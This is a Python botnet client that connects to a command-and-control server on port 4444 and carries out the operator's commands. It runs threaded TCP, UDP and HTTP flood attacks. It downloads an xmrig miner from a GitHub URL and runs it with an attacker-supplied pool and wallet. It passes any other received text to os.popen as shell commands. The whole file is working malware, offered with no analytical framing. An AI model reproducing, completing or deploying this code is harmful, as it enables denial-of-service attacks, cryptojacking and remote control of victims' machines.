import sys
import threading
import requests
import socket
import os

host = "127.0.0.1"
port = 4444


def client():
    try:
        c = socket.socket()
        c.connect((host, port))

        while True:
            data = c.recv(1024).decode()

            if data == "ping":
                c.sendall(b'pong')

            elif data.startswith("tcp"):
                data = data.split()

                tcp_ip = socket.gethostbyname(data[1])
                tcp_port = int(data[2])
                tcp_threads = int(data[3])

                data = " ".join(data)

                print(f"\033[31m! {data} !\033[0m")

                tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_sock.connect((tcp_ip, tcp_port))

                def tcp():
                    try:
                        request = f"GET / HTTP/1.1\r\nHost: {tcp_ip}\r\n\r\n".encode()
                        tcp_sock.sendall(request)

                        print("\033[32m[+]\033[0m TCP Packet sent ->", tcp_ip)

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def tcp_t():
                    for i in range(tcp_threads):
                        tcp_th = threading.Thread(target=tcp)
                        tcp_th.start()

                t = threading.Thread(target=tcp_t)
                t.start()

            elif data.startswith("udp"):
                data = data.split()

                udp_ip = socket.gethostbyname(data[1])
                udp_threads = int(data[2])
                udp_port = int()

                data = " ".join(data)

                print(f"\033[31m! {data} !\033[0m")

                udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                def udp():
                    try:
                        request = f"GET / HTTP/1.1\r\nHost: {udp_ip}\r\n\r\n".encode()

                        udp_sock.sendto(request, (udp_ip, udp_port))
                        print("\033[32m[+]\033[0m UDP Packet sent ->", udp_ip)

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def udp_t():
                    for i in range(udp_threads):
                        udp_th = threading.Thread(target=udp)
                        udp_th.start()

                t = threading.Thread(target=udp_t)
                t.start()

            elif data.startswith("request"):
                data = data.split()

                req_url = data[1]
                req_threads = int(data[2])

                data = " ".join(data)

                print(f"\033[31m! {data} !\033[0m")

                response = requests.get(req_url)

                def req():
                    try:
                        requests.get(req_url)
                        print("\033[32m[+]\033[0m Request Packet sent ->", req_url)

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def req_t():
                    if response.status_code == 200:
                        for i in range(req_threads):
                            req_th = threading.Thread(target=req)
                            req_th.start()

                t = threading.Thread(target=req_t)
                t.start()

            elif data.startswith("miner"):
                data = data.split()

                pool = data[1]
                wallet = data[2]
                worker = data[3]

                data = " ".join(data)

                print(f"\033[31m! {data} !\033[0m")

                if sys.platform == "linux":
                    url = 'https://github.com/rxyzqc/SC/raw/main/xmrig'
                    rig = "xmrig"
                else:
                    url = 'https://github.com/rxyzqc/SC/raw/main/xmrig.exe'
                    rig = "xmrig.exe"

                if not os.path.exists(rig):
                    response = requests.get(url)

                    with open(rig, 'wb') as f:
                        f.write(response.content)

                if os.path.exists(rig):
                    os.system(f"{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")

            else:
                os.popen(data)

    except socket.error:
        client()


client()
